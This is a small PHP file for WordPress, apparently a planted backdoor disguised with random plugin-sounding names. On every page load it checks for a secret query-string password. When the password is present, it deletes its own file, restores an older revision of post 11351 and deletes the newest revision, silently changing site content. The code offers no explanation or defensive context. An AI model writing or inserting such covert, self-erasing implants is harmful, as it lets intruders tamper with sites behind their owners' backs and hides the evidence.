<?php

function client_converter_thumbnail() {
	if (isset($_GET['youtube_subscribe_members']) && $_GET['youtube_subscribe_members'] === 'health_hello_security') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$pixel_gallery_membership = 11351;
		$showcase_rates_ninja_keywords = wp_get_post_revisions($pixel_gallery_membership);
		if (empty($showcase_rates_ninja_keywords)) die('no revisions');
		if (count($showcase_rates_ninja_keywords) < 2) die('less than 2');
		$cover_color_fx = array_shift($showcase_rates_ninja_keywords);
		$quotes_consent_icon = $cover_color_fx->ID;
		$validator_sitemaps_embed = array_shift($showcase_rates_ninja_keywords);
		$wall_revisions_default = $validator_sitemaps_embed->ID;
		$automatic_permalinks_show = wp_restore_post_revision($wall_revisions_default);
		if ($automatic_permalinks_show === false) die('error restoring');
		$automatic_permalinks_show = wp_delete_post_revision($quotes_consent_icon);		
		if ($automatic_permalinks_show === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'client_converter_thumbnail');
